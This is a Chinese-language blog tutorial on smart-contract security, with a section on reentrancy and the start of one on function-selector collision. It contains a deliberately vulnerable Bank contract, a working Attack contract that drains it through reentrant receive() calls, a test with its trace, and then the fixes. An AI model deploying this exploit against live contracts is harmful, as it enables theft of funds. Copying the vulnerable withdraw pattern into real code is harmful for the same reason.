

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Wangxiaowang">
  <meta name="keywords" content="">
  
    <meta name="description" content="先看总结 S01 重入攻击重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币 重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币 0xAA 抢银行的故事为了让大家更好理解，这里讲一个”黑客0xAA抢银行”的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）">
<meta property="og:type" content="article">
<meta property="og:title" content="08-9Solidity笔记之十合约安全项">
<meta property="og:url" content="http://example.com/2025/08/21/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%8D%81%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%A1%B9/index.html">
<meta property="og:site_name" content="Wang">
<meta property="og:description" content="先看总结 S01 重入攻击重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币 重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币 0xAA 抢银行的故事为了让大家更好理解，这里讲一个”黑客0xAA抢银行”的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/web3/eth2.jpg">
<meta property="article:published_time" content="2025-08-21T02:29:30.000Z">
<meta property="article:modified_time" content="2025-08-27T07:27:37.118Z">
<meta property="article:author" content="Wangxiaowang">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/web3/eth2.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>08-9Solidity笔记之十合约安全项 - Wang</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"37fd8385820c4abc0e564a2c423b7511","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?37fd8385820c4abc0e564a2c423b7511";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Home</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/web3/solidity1.jpeg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="08-9Solidity笔记之十合约安全项"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-08-21 10:29" pubdate>
          2025年8月21日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          17k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          142 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">08-9Solidity笔记之十合约安全项</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="先看总结"><a href="#先看总结" class="headerlink" title="先看总结"></a>先看总结</h1><p><img src="/img/web3/contract_safe.png" srcset="/img/loading.gif" lazyload alt="contract_safe"></p>
<h1 id="S01-重入攻击"><a href="#S01-重入攻击" class="headerlink" title="S01 重入攻击"></a>S01 重入攻击</h1><p>重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币</p>
<p>重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币</p>
<h2 id="0xAA-抢银行的故事"><a href="#0xAA-抢银行的故事" class="headerlink" title="0xAA 抢银行的故事"></a><code>0xAA</code> 抢银行的故事</h2><p>为了让大家更好理解，这里讲一个”黑客<code>0xAA</code>抢银行”的故事。</p>
<p>以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：</p>
<ol>
<li>查询用户的 <code>ETH</code> 余额，如果大于 0，进行下一步。</li>
<li>将用户的 <code>ETH</code> 余额从银行转给用户，并询问用户是否收到。</li>
<li>将用户名下的余额更新为<code>0</code>。</li>
</ol>
<p>一天黑客 <code>0xAA</code> 来到了银行，这是他和机器人柜员的对话：</p>
<ul>
<li>0xAA : 我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>…</li>
</ul>
<p>最后，<code>0xAA</code>通过重入攻击的漏洞，把银行的资产搬空了，银行卒。</p>
<p><img src="/img/web3/S01-1.png" srcset="/img/loading.gif" lazyload alt="S01-1"></p>
<h2 id="漏洞合约例子"><a href="#漏洞合约例子" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="银行合约"><a href="#银行合约" class="headerlink" title="银行合约"></a>银行合约</h3><p>银行合约非常简单，包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；包含<code>3</code>个函数：</p>
<ul>
<li><code>deposit()</code>：存款函数，将<code>ETH</code>存入银行合约，并更新用户的余额。</li>
<li><code>withdraw()</code>：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。<strong>注意：这个函数有重入漏洞！</strong></li>
<li><code>getBalance()</code>：获取银行合约里的<code>ETH</code>余额。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping<br><br>    // 存入ether，并更新余额<br>    function deposit() external payable &#123;<br>        balanceOf[msg.sender] += msg.value;<br>    &#125;<br><br>    // 提取msg.sender的全部ether<br>    function withdraw() external &#123;<br>        uint256 balance = balanceOf[msg.sender]; // 获取余额<br>        require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！<br>        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>        require(success, &quot;Failed to send Ether&quot;);<br>        // 更新余额<br>        balanceOf[msg.sender] = 0;<br>    &#125;<br><br>    // 获取银行合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><p>重入攻击的一个攻击点就是合约转账<code>ETH</code>的地方：转账<code>ETH</code>的目标地址如果是合约，会触发对方合约的<code>fallback</code>（回退）函数，从而造成循环调用的可能。如果你不了解回退函数，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/19_Fallback/readme.md">WTF Solidity 极简教程第 19 讲：接收 ETH</a>。<code>Bank</code>合约在<code>withdraw()</code>函数中存在<code>ETH</code>转账：</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">(<span class="hljs-keyword">bool</span> success, ) = msg.sender.<span class="hljs-keyword">call</span>&#123;value: <span class="hljs-built_in">balance</span>&#125;(<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure>



<p>假如黑客在攻击合约中的<code>fallback()</code>或<code>receive()</code>函数中重新调用了<code>Bank</code>合约的<code>withdraw()</code>函数，就会造成<code>0xAA</code>抢银行故事中的循环调用，不断让<code>Bank</code>合约转账给攻击者，最终将合约的<code>ETH</code>提空。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">receive</span>() external payable &#123;<br>    bank<span class="hljs-selector-class">.withdraw</span>();<br>&#125;<br></code></pre></td></tr></table></figure>



<p>下面我们看下攻击合约，它的逻辑非常简单，就是通过<code>receive()</code>回退函数循环调用<code>Bank</code>合约的<code>withdraw()</code>函数。它有<code>1</code>个状态变量<code>bank</code>用于记录<code>Bank</code>合约地址。它包含<code>4</code>个函数：</p>
<ul>
<li>构造函数: 初始化<code>Bank</code>合约地址。</li>
<li><code>receive()</code>: 回调函数，在接收<code>ETH</code>时被触发，并再次调用<code>Bank</code>合约的<code>withdraw()</code>函数，循环提款。</li>
<li><code>attack()</code>：攻击函数，先<code>Bank</code>合约的<code>deposit()</code>函数存款，然后调用<code>withdraw()</code>发起第一次提款，之后<code>Bank</code>合约的<code>withdraw()</code>函数和攻击合约的<code>receive()</code>函数会循环调用，将<code>Bank</code>合约的<code>ETH</code>提空。</li>
<li><code>getBalance()</code>：获取攻击合约里的<code>ETH</code>余额。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    Bank public bank; // Bank合约地址<br><br>    // 初始化Bank合约地址<br>    constructor(Bank _bank) &#123;<br>        bank = _bank;<br>    &#125;<br><br>    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数<br>    receive() external payable &#123;<br>        if (bank.getBalance() &gt;= 1 ether) &#123;<br>            bank.withdraw();<br>        &#125;<br>    &#125;<br><br>    // 攻击函数，调用时 msg.value 设为 1 ether<br>    function attack() external payable &#123;<br>        require(msg.value == 1 ether, &quot;Require 1 Ether to attack&quot;);<br>        bank.deposit&#123;value: 1 ether&#125;();<br>        bank.withdraw();<br>    &#125;<br><br>    // 获取本合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol>
<li>部署<code>Bank</code>合约，调用<code>deposit()</code>函数，转入<code>20 ETH</code>。</li>
<li>切换到攻击者钱包，部署<code>Attack</code>合约。</li>
<li>调用<code>Attack</code>合约的<code>attack()</code>函数发动攻击，调用时需转账<code>1 ETH</code>。</li>
<li>调用<code>Bank</code>合约的<code>getBalance()</code>函数，发现余额已被提空。</li>
<li>调用<code>Attack</code>合约的<code>getBalance()</code>函数，可以看到余额变为<code>21 ETH</code>，重入攻击成功。</li>
</ol>
<p>当然，不仅仅<code>ETH</code>转账会触发重入攻击，<code>ERC721</code>和<code>ERC1155</code>的<code>safeTransfer()</code>和<code>safeTransferFrom()</code>安全转账函数，还有<code>ERC777</code>的<code>callback</code>函数，都可能会引发重入攻击。所以这更多的是一个宏观上的设计问题，而不仅仅局限于ETH转账本身。</p>
<ul>
<li>演示测试攻击合约的代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract AttackTest is Test &#123;<br>    Bank public bank;<br>    Attack public attack;<br>    function setUp() public &#123;<br>        bank = new Bank(); // 部署Bank合约<br>        vm.deal(address(this), 1000 * 1e18);<br>        bank.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        attack = new Attack(bank); // 部署攻击合约<br>    &#125;<br>    function test_attack() public &#123;<br>        // 攻击执行<br>        console.log(&quot;attack start&quot;);<br>        attack.attack&#123;value: 1 * 1e18&#125;();<br>        // 测试断言：例如：检查Bank合约的余额是否被耗尽<br>        assertEq(address(bank).balance, 0, &quot;Bank should be drained&quot;);<br>        console.log(&quot;attack end&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>运行情况打印：循环调用不停的重入攻击</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traces:<br>  [89457] AttackTest::test_attack()<br>    ├─ [0] console::log(&quot;attack start&quot;) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [70996] Attack::attack&#123;value: 1000000000000000000&#125;()<br>    │   ├─ [22559] Bank::deposit&#123;value: 1000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   ├─ [36132] Bank::withdraw()<br>    │   │   ├─ [28467] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   └─ ← [Return] 3000000000000000000 [3e18]<br>    │   │   │   ├─ [26982] Bank::withdraw()<br>    │   │   │   │   ├─ [19317] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   └─ ← [Return] 2000000000000000000 [2e18]<br>    │   │   │   │   │   ├─ [17832] Bank::withdraw()<br>    │   │   │   │   │   │   ├─ [10167] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]<br>    │   │   │   │   │   │   │   ├─ [8682] Bank::withdraw()<br>    │   │   │   │   │   │   │   │   ├─ [1017] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0<br>    │   │   │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   └─ ← [Stop]<br>    │   │   │   └─ ← [Stop]<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [0] console::log(&quot;attack end&quot;) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>



<h3 id="检查-影响-交互模式"><a href="#检查-影响-交互模式" class="headerlink" title="检查-影响-交互模式"></a>检查-影响-交互模式</h3><p>检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将<code>Bank</code>合约<code>withdraw()</code>函数中的更新余额提前到转账<code>ETH</code>之前，就可以修复漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw() external &#123;<br>    uint256 balance = balanceOf[msg.sender];<br>    require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH<br>    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。<br>    balanceOf[msg.sender] = 0;<br>    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>    require(success, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="重入锁"><a href="#重入锁" class="headerlink" title="重入锁"></a>重入锁</h3><p>重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为<code>0</code>的状态变量<code>_status</code>。被<code>nonReentrant</code>重入锁修饰的函数，在第一次调用时会检查<code>_status</code>是否为<code>0</code>，紧接着将<code>_status</code>的值改为<code>1</code>，调用结束后才会再改为<code>0</code>。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/11_Modifier/readme.md">WTF Solidity 极简教程第 11 讲：修饰器</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 private _status; // 重入锁<br><br>// 重入锁<br>modifier nonReentrant() &#123;<br>    // 在第一次调用 nonReentrant 时，_status 将是 0<br>    require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>    // 在此之后对 nonReentrant 的任何调用都将失败<br>    _status = 1;<br>    _;<br>    // 调用结束，将 _status 恢复为0<br>    _status = 0;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>只需要用<code>nonReentrant</code>重入锁修饰<code>withdraw()</code>函数，就可以预防重入攻击了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用重入锁保护有漏洞的函数<br>function withdraw() external nonReentrant&#123;<br>    uint256 balance = balanceOf[msg.sender];<br>    require(balance &gt; 0, &quot;Insufficient balance&quot;);<br><br>    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>    require(success, &quot;Failed to send Ether&quot;);<br><br>    balanceOf[msg.sender] = 0;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>此外，OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过<code>_asyncTransfer(address dest, uint256 amount)</code>将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用<code>withdrawPayments(address payable payee)</code>进行资产的主动获取。</p>
<p><strong>OpenZeppelin 提供了 <code>ReentrancyGuard</code> 合约，使用修饰器防止重入</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个<code>0xAA</code>抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行<code>ETH</code>转账时进行重入攻击。实际业务中，<code>ERC721</code>和<code>ERC1155</code>的<code>safeTransfer()</code>和<code>safeTransferFrom()</code>安全转账函数，还有<code>ERC777</code>的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的<code>external</code>函数，虽然可能会消耗更多的<code>gas</code>，但是可以预防更大的损失。</p>
<h1 id="S02-选择器碰撞"><a href="#S02-选择器碰撞" class="headerlink" title="S02. 选择器碰撞"></a>S02. 选择器碰撞</h1><p>这一讲，我们将介绍选择器碰撞攻击，它是导致跨链桥 Poly Network 被黑的原因之一。在2021年8月，Poly Network在ETH，BSC，和Polygon上的跨链桥合约被盗，损失高达6.11亿美元（<a target="_blank" rel="noopener" href="https://rekt.news/zh/polynetwork-rekt/">总结</a>）。这是2021年最大的区块链黑客事件，也是历史被盗金额榜单上第2名，仅次于 Ronin 桥黑客事件。</p>
<h2 id="选择器碰撞"><a href="#选择器碰撞" class="headerlink" title="选择器碰撞"></a>选择器碰撞</h2><p>以太坊智能合约中，函数选择器是函数签名 <code>&quot;&lt;function name&gt;(&lt;function input types&gt;)&quot;</code> 的哈希值的前<code>4</code>个字节（<code>8</code>位十六进制）。当用户调用合约的函数时，<code>calldata</code>的前<code>4</code>字节就是目标函数的选择器，决定了调用哪个函数。如果你不了解它，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/29_Selector/readme.md">WTF Solidity极简教程第29讲：函数选择器</a>。</p>
<p>由于函数选择器只有<code>4</code>字节，非常短，很容易被碰撞出来：即我们很容易找到两个不同的函数，但是他们有着相同的函数选择器。比如<code>transferFrom(address,address,uint256)</code>和<code>gasprice_bit_ether(int128)</code>有着相同的选择器：<code>0x23b872dd</code>。当然你也可以写个脚本暴力破解。</p>
<p>大家可以用这两个网站来查同一个选择器对应的不同函数：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.4byte.directory/">https://www.4byte.directory/</a></li>
<li><a target="_blank" rel="noopener" href="https://sig.eth.samczsun.com/">https://sig.eth.samczsun.com/</a></li>
</ol>
<p>你也可以使用下面的<code>Power Clash</code>工具进行暴力破解：</p>
<ol>
<li>PowerClash: <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/power-clash">https://github.com/AmazingAng/power-clash</a></li>
</ol>
<p>相比之下，钱包的公钥有<code>64</code>字节，被碰撞出来的概率几乎为<code>0</code>，非常安全。</p>
<h2 id="0xAA-解决斯芬克斯之谜"><a href="#0xAA-解决斯芬克斯之谜" class="headerlink" title="0xAA 解决斯芬克斯之谜"></a><code>0xAA</code> 解决斯芬克斯之谜</h2><p>以太坊的人得罪了天神，天神震怒。天后赫拉为了惩罚以太坊的人，在以太坊的峭崖上降下一个名叫斯芬克斯的人面狮身的女妖。她向每一个路过悬崖的以太坊用户提出一个谜语：“什么东西在早晨用四只脚走路，中午两只脚走路，晚间三只脚走路，在一切生物中这是唯一的用不同数目的脚走路的生物。脚最多的时候，正是速度和力量最小的时候。”对于这个奥妙费解的谜语，凡猜中者即可活命，凡猜不中者一律被吃掉。过路的人全被斯芬克斯吃了，以太坊用户陷入恐惧之中。斯芬克斯用选择器<code>0x10cd2dc7</code>来验证答案是否正确。</p>
